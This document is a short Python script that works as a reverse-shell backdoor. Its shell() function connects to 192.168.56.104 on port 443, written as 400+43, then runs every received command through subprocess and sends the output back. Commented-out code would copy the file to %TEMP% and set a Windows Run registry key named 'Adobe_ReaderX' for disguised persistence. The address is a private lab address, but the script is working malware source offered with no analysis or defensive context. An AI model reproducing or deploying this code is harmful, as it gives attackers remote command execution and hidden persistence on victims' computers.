import sys, base64, os, socket, subprocess, time
#from _winreg import *
 
#def autorun(tempdir, fileName, run):
# Copy executable to %TEMP%:
#    os.system('copy %s %s'%(fileName, tempdir))
 
# Queries Windows registry for the autorun key value
# Stores the key values in runkey array
#    key = OpenKey(HKEY_LOCAL_MACHINE, run)
#    runkey =[]
#    try:
#        i = 0
#        while True:
#            subkey = EnumValue(key, i)
#            runkey.append(subkey[0])
#            i += 1
#    except WindowsError:
#        pass
 
# If the autorun key "Adobe ReaderX" isn't set this will set the key:
#    if 'Adobe ReaderX' not in runkey:
#        try:
#            key= OpenKey(HKEY_LOCAL_MACHINE, run,0,KEY_ALL_ACCESS)
#            SetValueEx(key ,'Adobe_ReaderX',0,REG_SZ,r"%TEMP%mw.exe")
#            key.Close()
#        except WindowsError:
#            pass
 
def shell():
#Base64 encoded reverse shell
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.56.104',int(400+43)))
        while 1:
            i = int(0)
            s.send(b'\n>>>')
            data = s.recv(1024).decode("utf-8")
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_value = proc.stdout.read() + proc.stderr.read()
            #encoded = base64.b64encode(stdout_value)
            #s.send(encoded)
            s.send(stdout_value)
            i += 1
            if i==3: break
        s.close()
    except Exception as e:
        time.sleep(3)
        #shell()
        
def main():
#    tempdir = '%TEMP%'
#    fileName = sys.argv[0]
#    run = "SoftwareMicrosoftWindowsCurrentVersionRun"
#    autorun(tempdir, fileName, run)
     shell()
 
if __name__ == "__main__":
    main()